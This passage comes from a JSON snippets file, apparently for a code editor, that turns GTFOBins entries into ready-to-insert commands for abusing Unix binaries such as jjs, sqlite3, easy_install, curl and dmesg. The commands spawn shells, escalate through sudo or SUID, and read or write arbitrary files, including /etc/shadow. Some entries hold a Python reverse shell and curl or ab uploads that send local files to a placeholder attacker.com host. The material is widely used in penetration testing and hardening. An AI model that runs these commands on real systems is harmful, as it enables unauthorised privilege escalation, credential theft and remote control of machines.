            "",
            "```sh",
            "echo 'var BufferedReader = Java.type(\"java.io.BufferedReader\");",
            "var FileReader = Java.type(\"java.io.FileReader\");",
            "var br = new BufferedReader(new FileReader(\"${1:file_to_read}\"));",
            "while ((line = br.readLine()) != null) { print(line); }' | jjs${0}",
            "```"
        ],
        "description": "abuse jjs with file-read"
    },
    "jjs suid (gtfobins)": {
        "prefix": "jjs suid",
        "body": [
            "abuse jjs with suid, This has been found working in macOS but failing on Linux systems.",
            "",
            "```sh",
            "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \\\\$@|sh\\${IFS}-p _ echo sh -p <\\$(tty) >\\$(tty) 2>\\$(tty)').waitFor()\" | ./jjs${0}",
            "```"
        ],
        "description": "abuse jjs with suid - This has been found working in macOS but failing on Linux systems."
    },
    "jjs sudo (gtfobins)": {
        "prefix": "jjs sudo",
        "body": [
            "abuse jjs with sudo",
            "",
            "```sh",
            "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \\\\$@|sh _ echo sh <\\$(tty) >\\$(tty) 2>\\$(tty)').waitFor()\" | sudo jjs${0}",
            "```"
        ],
        "description": "abuse jjs with sudo"
    },
    "xmore file-read (gtfobins)": {
        "prefix": "xmore file-read",
        "body": [
            "abuse xmore with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "xmore \\$LFILE${0}",
            "```"
        ],
        "description": "abuse xmore with file-read"
    },
    "xmore suid (gtfobins)": {
        "prefix": "xmore suid",
        "body": [
            "abuse xmore with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./xmore \\$LFILE${0}",
            "```"
        ],
        "description": "abuse xmore with suid"
    },
    "xmore sudo (gtfobins)": {
        "prefix": "xmore sudo",
        "body": [
            "abuse xmore with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo xmore \\$LFILE${0}",
            "```"
        ],
        "description": "abuse xmore with sudo"
    },
    "xdotool shell (gtfobins)": {
        "prefix": "xdotool shell",
        "body": [
            "abuse xdotool with shell",
            "",
            "```sh",
            "xdotool exec --sync /bin/sh${0}",
            "```"
        ],
        "description": "abuse xdotool with shell"
    },
    "xdotool suid (gtfobins)": {
        "prefix": "xdotool suid",
        "body": [
            "abuse xdotool with suid",
            "",
            "```sh",
            "./xdotool exec --sync /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse xdotool with suid"
    },
    "xdotool sudo (gtfobins)": {
        "prefix": "xdotool sudo",
        "body": [
            "abuse xdotool with sudo",
            "",
            "```sh",
            "sudo xdotool exec --sync /bin/sh${0}",
            "```"
        ],
        "description": "abuse xdotool with sudo"
    },
    "setarch shell (gtfobins)": {
        "prefix": "setarch shell",
        "body": [
            "abuse setarch with shell",
            "",
            "```sh",
            "setarch \\$(arch) /bin/sh${0}",
            "```"
        ],
        "description": "abuse setarch with shell"
    },
    "setarch suid (gtfobins)": {
        "prefix": "setarch suid",
        "body": [
            "abuse setarch with suid",
            "",
            "```sh",
            "./setarch \\$(arch) /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse setarch with suid"
    },
    "setarch sudo (gtfobins)": {
        "prefix": "setarch sudo",
        "body": [
            "abuse setarch with sudo",
            "",
            "```sh",
            "sudo setarch \\$(arch) /bin/sh${0}",
            "```"
        ],
        "description": "abuse setarch with sudo"
    },
    "ispell shell (gtfobins)": {
        "prefix": "ispell shell",
        "body": [
            "abuse ispell with shell",
            "",
            "```sh",
            "ispell /etc/passwd",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse ispell with shell"
    },
    "ispell suid (gtfobins)": {
        "prefix": "ispell suid",
        "body": [
            "abuse ispell with suid",
            "",
            "```sh",
            "./ispell /etc/passwd",
            "!/bin/sh -p${0}",
            "```"
        ],
        "description": "abuse ispell with suid"
    },
    "ispell sudo (gtfobins)": {
        "prefix": "ispell sudo",
        "body": [
            "abuse ispell with sudo",
            "",
            "```sh",
            "sudo ispell /etc/passwd",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse ispell with sudo"
    },
    "dd file-write (gtfobins)": {
        "prefix": "dd file-write",
        "body": [
            "abuse dd with file-write",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "echo \"DATA\" | dd of=\\$LFILE${0}",
            "```"
        ],
        "description": "abuse dd with file-write"
    },
    "dd file-read (gtfobins)": {
        "prefix": "dd file-read",
        "body": [
            "abuse dd with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "dd if=\\$LFILE${0}",
            "```"
        ],
        "description": "abuse dd with file-read"
    },
    "dd suid (gtfobins)": {
        "prefix": "dd suid",
        "body": [
            "abuse dd with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "echo \"data\" | ./dd of=\\$LFILE${0}",
            "```"
        ],
        "description": "abuse dd with suid"
    },
    "dd sudo (gtfobins)": {
        "prefix": "dd sudo",
        "body": [
            "abuse dd with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "echo \"data\" | sudo dd of=\\$LFILE${0}",
            "```"
        ],
        "description": "abuse dd with sudo"
    },
    "sqlite3 shell (gtfobins)": {
        "prefix": "sqlite3 shell",
        "body": [
            "abuse sqlite3 with shell",
            "",
            "```sh",
            "sqlite3 /dev/null '.shell /bin/sh'${0}",
            "```"
        ],
        "description": "abuse sqlite3 with shell"
    },
    "sqlite3 file-write (gtfobins)": {
        "prefix": "sqlite3 file-write",
        "body": [
            "abuse sqlite3 with file-write",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "sqlite3 /dev/null -cmd \".output \\$LFILE\" 'select \"DATA\";'${0}",
            "```"
        ],
        "description": "abuse sqlite3 with file-write"
    },
    "sqlite3 file-read (gtfobins)": {
        "prefix": "sqlite3 file-read",
        "body": [
            "abuse sqlite3 with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sqlite3 << EOF",
            "CREATE TABLE t(line TEXT);",
            ".import \\$LFILE t",
            "SELECT * FROM t;",
            "EOF${0}",
            "```"
        ],
        "description": "abuse sqlite3 with file-read"
    },
    "sqlite3 suid (gtfobins)": {
        "prefix": "sqlite3 suid",
        "body": [
            "abuse sqlite3 with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sqlite3 << EOF",
            "CREATE TABLE t(line TEXT);",
            ".import \\$LFILE t",
            "SELECT * FROM t;",
            "EOF${0}",
            "```"
        ],
        "description": "abuse sqlite3 with suid"
    },
    "sqlite3 sudo (gtfobins)": {
        "prefix": "sqlite3 sudo",
        "body": [
            "abuse sqlite3 with sudo",
            "",
            "```sh",
            "sudo sqlite3 /dev/null '.shell /bin/sh'${0}",
            "```"
        ],
        "description": "abuse sqlite3 with sudo"
    },
    "sqlite3 limited-suid (gtfobins)": {
        "prefix": "sqlite3 limited-suid",
        "body": [
            "abuse sqlite3 with limited-suid",
            "",
            "```sh",
            "./sqlite3 /dev/null '.shell /bin/sh'${0}",
            "```"
        ],
        "description": "abuse sqlite3 with limited-suid"
    },
    "dosbox file-read (gtfobins)": {
        "prefix": "dosbox file-read",
        "body": [
            "abuse dosbox with file-read, The file is copied to a readable location.",
            "",
            "```sh",
            "LFILE='\\path\\to\\${1:file_to_read}'",
            "dosbox -c 'mount c /' -c \"copy c:\\$LFILE c:\\tmp\\output\" -c exit",
            "cat '/tmp/OUTPUT'${0}",
            "```"
        ],
        "description": "abuse dosbox with file-read - The file is copied to a readable location."
    },
    "dosbox file-write (gtfobins)": {
        "prefix": "dosbox file-write",
        "body": [
            "abuse dosbox with file-write, Note that the name of the written file in the following example will be `FILE_TO_`. Also note that `echo` terminates the string with a DOS-style line terminator (`\\r\\n`), if that's a problem and your scenario allows it, you can create the file outside `dosbox`, then use `copy` to do the actual write.",
            "",
            "```sh",
            "LFILE='\\path\\to\\${1:file_to_write}'",
            "dosbox -c 'mount c /' -c \"echo DATA >c:\\$LFILE\" -c exit${0}",
            "```"
        ],
        "description": "abuse dosbox with file-write - Note that the name of the written file in the following example will be `FILE_TO_`. Also note that `echo` terminates the string with a DOS-style line terminator (`\\r\\n`), if that's a problem and your scenario allows it, you can create the file outside `dosbox`, then use `copy` to do the actual write."
    },
    "dosbox suid (gtfobins)": {
        "prefix": "dosbox suid",
        "body": [
            "abuse dosbox with suid, Note that the name of the written file in the following example will be `FILE_TO_`. Also note that `echo` terminates the string with a DOS-style line terminator (`\\r\\n`), if that's a problem and your scenario allows it, you can create the file outside `dosbox`, then use `copy` to do the actual write.",
            "",
            "```sh",
            "LFILE='\\path\\to\\${1:file_to_write}'",
            "./dosbox -c 'mount c /' -c \"echo DATA >c:\\$LFILE\" -c exit${0}",
            "```"
        ],
        "description": "abuse dosbox with suid - Note that the name of the written file in the following example will be `FILE_TO_`. Also note that `echo` terminates the string with a DOS-style line terminator (`\\r\\n`), if that's a problem and your scenario allows it, you can create the file outside `dosbox`, then use `copy` to do the actual write."
    },
    "dosbox sudo (gtfobins)": {
        "prefix": "dosbox sudo",
        "body": [
            "abuse dosbox with sudo, Note that the name of the written file in the following example will be `FILE_TO_`. Also note that `echo` terminates the string with a DOS-style line terminator (`\\r\\n`), if that's a problem and your scenario allows it, you can create the file outside `dosbox`, then use `copy` to do the actual write.",
            "",
            "```sh",
            "LFILE='\\path\\to\\${1:file_to_write}'",
            "sudo dosbox -c 'mount c /' -c \"echo DATA >c:\\$LFILE\" -c exit${0}",
            "```"
        ],
        "description": "abuse dosbox with sudo - Note that the name of the written file in the following example will be `FILE_TO_`. Also note that `echo` terminates the string with a DOS-style line terminator (`\\r\\n`), if that's a problem and your scenario allows it, you can create the file outside `dosbox`, then use `copy` to do the actual write."
    },
    "tic file-read (gtfobins)": {
        "prefix": "tic file-read",
        "body": [
            "abuse tic with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "tic -C \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse tic with file-read"
    },
    "tic suid (gtfobins)": {
        "prefix": "tic suid",
        "body": [
            "abuse tic with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./tic -C \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse tic with suid"
    },
    "tic sudo (gtfobins)": {
        "prefix": "tic sudo",
        "body": [
            "abuse tic with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo tic -C \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse tic with sudo"
    },
    "ltrace file-read (gtfobins)": {
        "prefix": "ltrace file-read",
        "body": [
            "abuse ltrace with file-read, The file is parsed as a configuration file and its content is shown as error messages, thus this is not suitable to exfiltrate binary files.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "ltrace -F \\$LFILE /dev/null${0}",
            "```"
        ],
        "description": "abuse ltrace with file-read - The file is parsed as a configuration file and its content is shown as error messages, thus this is not suitable to exfiltrate binary files."
    },
    "ltrace file-write (gtfobins)": {
        "prefix": "ltrace file-write",
        "body": [
            "abuse ltrace with file-write, The data to be written appears amid the library function call log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough. More generally, any binary that executes whatever library function call passing arbitrary data can be used in place of `ltrace -F DATA`.",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "ltrace -s 999 -o \\$LFILE ltrace -F DATA${0}",
            "```"
        ],
        "description": "abuse ltrace with file-write - The data to be written appears amid the library function call log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough. More generally, any binary that executes whatever library function call passing arbitrary data can be used in place of `ltrace -F DATA`."
    },
    "ltrace shell (gtfobins)": {
        "prefix": "ltrace shell",
        "body": [
            "abuse ltrace with shell",
            "",
            "```sh",
            "ltrace -b -L /bin/sh${0}",
            "```"
        ],
        "description": "abuse ltrace with shell"
    },
    "ltrace sudo (gtfobins)": {
        "prefix": "ltrace sudo",
        "body": [
            "abuse ltrace with sudo",
            "",
            "```sh",
            "sudo ltrace -b -L /bin/sh${0}",
            "```"
        ],
        "description": "abuse ltrace with sudo"
    },
    "7z file-read (gtfobins)": {
        "prefix": "7z file-read",
        "body": [
            "abuse 7z with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "7z a -ttar -an -so \\$LFILE | 7z e -ttar -si -so${0}",
            "```"
        ],
        "description": "abuse 7z with file-read"
    },
    "7z sudo (gtfobins)": {
        "prefix": "7z sudo",
        "body": [
            "abuse 7z with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo 7z a -ttar -an -so \\$LFILE | 7z e -ttar -si -so${0}",
            "```"
        ],
        "description": "abuse 7z with sudo"
    },
    "rc shell (gtfobins)": {
        "prefix": "rc shell",
        "body": [
            "abuse rc with shell",
            "",
            "```sh",
            "rc -c '/bin/sh'${0}",
            "```"
        ],
        "description": "abuse rc with shell"
    },
    "rc suid (gtfobins)": {
        "prefix": "rc suid",
        "body": [
            "abuse rc with suid",
            "",
            "```sh",
            "./rc -c '/bin/sh -p'${0}",
            "```"
        ],
        "description": "abuse rc with suid"
    },
    "rc sudo (gtfobins)": {
        "prefix": "rc sudo",
        "body": [
            "abuse rc with sudo",
            "",
            "```sh",
            "sudo rc -c '/bin/sh'${0}",
            "```"
        ],
        "description": "abuse rc with sudo"
    },
    "bpftrace sudo (gtfobins)": {
        "prefix": "bpftrace sudo",
        "body": [
            "abuse bpftrace with sudo",
            "",
            "```sh",
            "sudo bpftrace -c /bin/sh -e 'END {exit()}'${0}",
            "```"
        ],
        "description": "abuse bpftrace with sudo"
    },
    "tmate shell (gtfobins)": {
        "prefix": "tmate shell",
        "body": [
            "abuse tmate with shell",
            "",
            "```sh",
            "tmate -c /bin/sh${0}",
            "```"
        ],
        "description": "abuse tmate with shell"
    },
    "tmate sudo (gtfobins)": {
        "prefix": "tmate sudo",
        "body": [
            "abuse tmate with sudo",
            "",
            "```sh",
            "sudo tmate -c /bin/sh${0}",
            "```"
        ],
        "description": "abuse tmate with sudo"
    },
    "tmate limited-suid (gtfobins)": {
        "prefix": "tmate limited-suid",
        "body": [
            "abuse tmate with limited-suid",
            "",
            "```sh",
            "./tmate -c /bin/sh${0}",
            "```"
        ],
        "description": "abuse tmate with limited-suid"
    },
    "xpad file-read (gtfobins)": {
        "prefix": "xpad file-read",
        "body": [
            "abuse xpad with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "xpad -f \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse xpad with file-read"
    },
    "xpad sudo (gtfobins)": {
        "prefix": "xpad sudo",
        "body": [
            "abuse xpad with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo xpad -f \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse xpad with sudo"
    },
    "dmesg file-read (gtfobins)": {
        "prefix": "dmesg file-read",
        "body": [
            "abuse dmesg with file-read, This is not suitable for binary files.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "dmesg -rF \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse dmesg with file-read - This is not suitable for binary files."
    },
    "dmesg shell (gtfobins)": {
        "prefix": "dmesg shell",
        "body": [
            "abuse dmesg with shell, This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
            "",
            "```sh",
            "dmesg -H",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse dmesg with shell - This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
    },
    "dmesg sudo (gtfobins)": {
        "prefix": "dmesg sudo",
        "body": [
            "abuse dmesg with sudo, This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
            "",
            "```sh",
            "sudo dmesg -H",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse dmesg with sudo - This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
    },
    "crash shell (gtfobins)": {
        "prefix": "crash shell",
        "body": [
            "abuse crash with shell, This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
            "",
            "```sh",
            "crash -h",
            "!sh${0}",
            "```"
        ],
        "description": "abuse crash with shell - This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
    },
    "crash command (gtfobins)": {
        "prefix": "crash command",
        "body": [
            "abuse crash with command",
            "",
            "```sh",
            "COMMAND='/usr/bin/id'",
            "CRASHPAGER=\"\\$COMMAND\" crash -h${0}",
            "```"
        ],
        "description": "abuse crash with command"
    },
    "crash sudo (gtfobins)": {
        "prefix": "crash sudo",
        "body": [
            "abuse crash with sudo, This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
            "",
            "```sh",
            "sudo crash -h",
            "!sh${0}",
            "```"
        ],
        "description": "abuse crash with sudo - This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
    },
    "pidstat command (gtfobins)": {
        "prefix": "pidstat command",
        "body": [
            "abuse pidstat with command",
            "",
            "```sh",
            "COMMAND=id",
            "pidstat -e \\$COMMAND${0}",
            "```"
        ],
        "description": "abuse pidstat with command"
    },
    "pidstat sudo (gtfobins)": {
        "prefix": "pidstat sudo",
        "body": [
            "abuse pidstat with sudo",
            "",
            "```sh",
            "COMMAND=id",
            "sudo pidstat -e \\$COMMAND${0}",
            "```"
        ],
        "description": "abuse pidstat with sudo"
    },
    "pidstat suid (gtfobins)": {
        "prefix": "pidstat suid",
        "body": [
            "abuse pidstat with suid",
            "",
            "```sh",
            "COMMAND=id",
            "./pidstat -e \\$COMMAND${0}",
            "```"
        ],
        "description": "abuse pidstat with suid"
    },
    "easy_install shell (gtfobins)": {
        "prefix": "easy_install shell",
        "body": [
            "abuse easy_install with shell",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <\\$(tty) >\\$(tty) 2>\\$(tty)')\" > \\$TF/setup.py",
            "easy_install \\$TF${0}",
            "```"
        ],
        "description": "abuse easy_install with shell"
    },
    "easy_install reverse-shell (gtfobins)": {
        "prefix": "easy_install reverse-shell",
        "body": [
            "abuse easy_install with reverse-shell, Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "TF=\\$(mktemp -d)",
            "echo 'import sys,socket,os,pty;s=socket.socket()",
            "s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))",
            "[os.dup2(s.fileno(),fd) for fd in (0,1,2)]",
            "pty.spawn(\"/bin/sh\")' > \\$TF/setup.py",
            "easy_install \\$TF${0}",
            "```"
        ],
        "description": "abuse easy_install with reverse-shell - Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell."
    },
    "easy_install file-upload (gtfobins)": {
        "prefix": "easy_install file-upload",
        "body": [
            "abuse easy_install with file-upload, Serve files in the local folder running an HTTP server.",
            "",
            "```sh",
            "export LPORT=8888",
            "TF=\\$(mktemp -d)",
            "echo 'import sys; from os import environ as e",
            "if sys.version_info.major == 3: import http.server as s, socketserver as ss",
            "else: import SimpleHTTPServer as s, SocketServer as ss",
            "ss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()' > \\$TF/setup.py",
            "easy_install \\$TF${0}",
            "```"
        ],
        "description": "abuse easy_install with file-upload - Serve files in the local folder running an HTTP server."
    },
    "easy_install file-download (gtfobins)": {
        "prefix": "easy_install file-download",
        "body": [
            "abuse easy_install with file-download, Fetch a remote file via HTTP GET request. The file path must be absolute.",
            "",
            "```sh",
            "export URL=http://${2:attacker.com}/file_to_get",
            "export LFILE=/tmp/${1:file_to_save}",
            "TF=\\$(mktemp -d)",
            "echo \"import os;",
            "os.execl('\\$(whereis python)', '\\$(whereis python)', '-c', \\\"\\\"\\\"import sys;",
            "if sys.version_info.major == 3: import urllib.request as r",
            "else: import urllib as r",
            "r.urlretrieve('\\$URL', '\\$LFILE')\\\"\\\"\\\")\" > \\$TF/setup.py",
            "pip install \\$TF${0}",
            "```"
        ],
        "description": "abuse easy_install with file-download - Fetch a remote file via HTTP GET request. The file path must be absolute."
    },
    "easy_install file-write (gtfobins)": {
        "prefix": "easy_install file-write",
        "body": [
            "abuse easy_install with file-write, The file path must be absolute.",
            "",
            "```sh",
            "export LFILE=/tmp/${1:file_to_save}",
            "TF=\\$(mktemp -d)",
            "echo \"import os;",
            "os.execl('\\$(whereis python)', 'python', '-c', 'open(\\\"\\$LFILE\\\",\\\"w+\\\").write(\\\"DATA\\\")')\" > \\$TF/setup.py",
            "easy_install \\$TF${0}",
            "```"
        ],
        "description": "abuse easy_install with file-write - The file path must be absolute."
    },
    "easy_install file-read (gtfobins)": {
        "prefix": "easy_install file-read",
        "body": [
            "abuse easy_install with file-read, The read file content is wrapped within program messages.",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo 'print(open(\"${1:file_to_read}\").read())' > \\$TF/setup.py",
            "easy_install \\$TF${0}",
            "```"
        ],
        "description": "abuse easy_install with file-read - The read file content is wrapped within program messages."
    },
    "easy_install library-load (gtfobins)": {
        "prefix": "easy_install library-load",
        "body": [
            "abuse easy_install with library-load",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")' > \\$TF/setup.py",
            "easy_install \\$TF${0}",
            "```"
        ],
        "description": "abuse easy_install with library-load"
    },
    "easy_install sudo (gtfobins)": {
        "prefix": "easy_install sudo",
        "body": [
            "abuse easy_install with sudo",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <\\$(tty) >\\$(tty) 2>\\$(tty)')\" > \\$TF/setup.py",
            "sudo easy_install \\$TF${0}",
            "```"
        ],
        "description": "abuse easy_install with sudo"
    },
    "env shell (gtfobins)": {
        "prefix": "env shell",
        "body": [
            "abuse env with shell",
            "",
            "```sh",
            "env /bin/sh${0}",
            "```"
        ],
        "description": "abuse env with shell"
    },
    "env suid (gtfobins)": {
        "prefix": "env suid",
        "body": [
            "abuse env with suid",
            "",
            "```sh",
            "./env /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse env with suid"
    },
    "env sudo (gtfobins)": {
        "prefix": "env sudo",
        "body": [
            "abuse env with sudo",
            "",
            "```sh",
            "sudo env /bin/sh${0}",
            "```"
        ],
        "description": "abuse env with sudo"
    },
    "bconsole shell (gtfobins)": {
        "prefix": "bconsole shell",
        "body": [
            "abuse bconsole with shell",
            "",
            "```sh",
            "bconsole",
            "@exec /bin/sh${0}",
            "```"
        ],
        "description": "abuse bconsole with shell"
    },
    "bconsole sudo (gtfobins)": {
        "prefix": "bconsole sudo",
        "body": [
            "abuse bconsole with sudo",
            "",
            "```sh",
            "sudo bconsole",
            "@exec /bin/sh${0}",
            "```"
        ],
        "description": "abuse bconsole with sudo"
    },
    "bconsole file-read (gtfobins)": {
        "prefix": "bconsole file-read",
        "body": [
            "abuse bconsole with file-read, The file is actually parsed and the first wrong line is returned in an error message, thus it may not be suitable for reading arbitrary files.",
            "",
            "```sh",
            "bconsole -c /etc/shadow${0}",
            "```"
        ],
        "description": "abuse bconsole with file-read - The file is actually parsed and the first wrong line is returned in an error message, thus it may not be suitable for reading arbitrary files."
    },
    "base64 file-read (gtfobins)": {
        "prefix": "base64 file-read",
        "body": [
            "abuse base64 with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "base64 \"\\$LFILE\" | base64 --decode${0}",
            "```"
        ],
        "description": "abuse base64 with file-read"
    },
    "base64 suid (gtfobins)": {
        "prefix": "base64 suid",
        "body": [
            "abuse base64 with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./base64 \"\\$LFILE\" | base64 --decode${0}",
            "```"
        ],
        "description": "abuse base64 with suid"
    },
    "base64 sudo (gtfobins)": {
        "prefix": "base64 sudo",
        "body": [
            "abuse base64 with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo base64 \"\\$LFILE\" | base64 --decode${0}",
            "```"
        ],
        "description": "abuse base64 with sudo"
    },
    "terraform file-read (gtfobins)": {
        "prefix": "terraform file-read",
        "body": [
            "abuse terraform with file-read",
            "",
            "```sh",
            "terraform console",
            "file(\"${1:file_to_read}\")${0}",
            "```"
        ],
        "description": "abuse terraform with file-read"
    },
    "terraform sudo (gtfobins)": {
        "prefix": "terraform sudo",
        "body": [
            "abuse terraform with sudo",
            "",
            "```sh",
            "sudo terraform console",
            "file(\"${1:file_to_read}\")${0}",
            "```"
        ],
        "description": "abuse terraform with sudo"
    },
    "terraform suid (gtfobins)": {
        "prefix": "terraform suid",
        "body": [
            "abuse terraform with suid",
            "",
            "```sh",
            "./terraform console",
            "file(\"${1:file_to_read}\")${0}",
            "```"
        ],
        "description": "abuse terraform with suid"
    },
    "zypper shell (gtfobins)": {
        "prefix": "zypper shell",
        "body": [
            "abuse zypper with shell",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "cp /bin/sh \\$TF/zypper-x",
            "export PATH=\\$TF:\\$PATH",
            "zypper x${0}",
            "```"
        ],
        "description": "abuse zypper with shell"
    },
    "zypper sudo (gtfobins)": {
        "prefix": "zypper sudo",
        "body": [
            "abuse zypper with sudo",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "cp /bin/sh \\$TF/zypper-x",
            "sudo PATH=\\$TF:\\$PATH zypper x${0}",
            "```"
        ],
        "description": "abuse zypper with sudo"
    },
    "aoss shell (gtfobins)": {
        "prefix": "aoss shell",
        "body": [
            "abuse aoss with shell",
            "",
            "```sh",
            "aoss /bin/sh${0}",
            "```"
        ],
        "description": "abuse aoss with shell"
    },
    "aoss sudo (gtfobins)": {
        "prefix": "aoss sudo",
        "body": [
            "abuse aoss with sudo",
            "",
            "```sh",
            "sudo aoss /bin/sh${0}",
            "```"
        ],
        "description": "abuse aoss with sudo"
    },
    "curl file-upload (gtfobins)": {
        "prefix": "curl file-upload",
        "body": [
            "abuse curl with file-upload, Send local file with an HTTP POST request. Run an HTTP service on the attacker box to collect the file. Note that the file will be sent as-is, instruct the service to not URL-decode the body. Omit the `@` to send hard-coded data.",
            "",
            "```sh",
            "URL=http://${2:attacker.com}/",
            "LFILE=${1:file_to_send}",
            "curl -X POST -d \"@\\$LFILE\" \\$URL${0}",
            "```"
        ],
        "description": "abuse curl with file-upload - Send local file with an HTTP POST request. Run an HTTP service on the attacker box to collect the file. Note that the file will be sent as-is, instruct the service to not URL-decode the body. Omit the `@` to send hard-coded data."
    },
    "curl file-download (gtfobins)": {
        "prefix": "curl file-download",
        "body": [
            "abuse curl with file-download, Fetch a remote file via HTTP GET request.",
            "",
            "```sh",
            "URL=http://${2:attacker.com}/file_to_get",
            "LFILE=${1:file_to_save}",
            "curl \\$URL -o \\$LFILE${0}",
            "```"
        ],
        "description": "abuse curl with file-download - Fetch a remote file via HTTP GET request."
    },
    "curl file-read (gtfobins)": {
        "prefix": "curl file-read",
        "body": [
            "abuse curl with file-read, The file path must be absolute.",
            "",
            "```sh",
            "LFILE=/tmp/${1:file_to_read}",
            "curl file://\\$LFILE${0}",
            "```"
        ],
        "description": "abuse curl with file-read - The file path must be absolute."
    },
    "curl file-write (gtfobins)": {
        "prefix": "curl file-write",
        "body": [
            "abuse curl with file-write, The file path must be absolute.",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "TF=\\$(mktemp)",
            "echo DATA >\\$TF",
            "curl \"file://\\$TF\" -o \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse curl with file-write - The file path must be absolute."
    },
    "curl suid (gtfobins)": {
        "prefix": "curl suid",
        "body": [
            "abuse curl with suid, Fetch a remote file via HTTP GET request.",
            "",
            "```sh",
            "URL=http://${2:attacker.com}/file_to_get",
            "LFILE=${1:file_to_save}",
            "./curl \\$URL -o \\$LFILE${0}",
            "```"
        ],
        "description": "abuse curl with suid - Fetch a remote file via HTTP GET request."
    },
    "curl sudo (gtfobins)": {
        "prefix": "curl sudo",
        "body": [
            "abuse curl with sudo, Fetch a remote file via HTTP GET request.",
            "",
            "```sh",
            "URL=http://${2:attacker.com}/file_to_get",
            "LFILE=${1:file_to_save}",
            "sudo curl \\$URL -o \\$LFILE${0}",
            "```"
        ],
        "description": "abuse curl with sudo - Fetch a remote file via HTTP GET request."
    },
    "ncftp shell (gtfobins)": {
        "prefix": "ncftp shell",
        "body": [
            "abuse ncftp with shell",
            "",
            "```sh",
            "ncftp",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse ncftp with shell"
    },
    "ncftp suid (gtfobins)": {
        "prefix": "ncftp suid",
        "body": [
            "abuse ncftp with suid",
            "",
            "```sh",
            "./ncftp",
            "!/bin/sh -p${0}",
            "```"
        ],
        "description": "abuse ncftp with suid"
    },
    "ncftp sudo (gtfobins)": {
        "prefix": "ncftp sudo",
        "body": [
            "abuse ncftp with sudo",
            "",
            "```sh",
            "sudo ncftp",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse ncftp with sudo"
    },
    "ab file-upload (gtfobins)": {
        "prefix": "ab file-upload",
        "body": [
            "abuse ab with file-upload, Upload local file via HTTP POST request.",
            "",
            "```sh",
            "URL=http://${2:attacker.com}/",
            "LFILE=${1:file_to_send}",
            "ab -p \\$LFILE \\$URL${0}",
            "```"
        ],
        "description": "abuse ab with file-upload - Upload local file via HTTP POST request."
    },
    "ab file-download (gtfobins)": {
        "prefix": "ab file-download",
        "body": [
            "abuse ab with file-download, Fetch a remote file via HTTP GET request. The response is returned as part of the verbose output of the program with some limitations on the length.",
            "",
            "```sh",
            "URL=http://${2:attacker.com}/${1:file_to_download}",
            "ab -v2 \\$URL${0}",
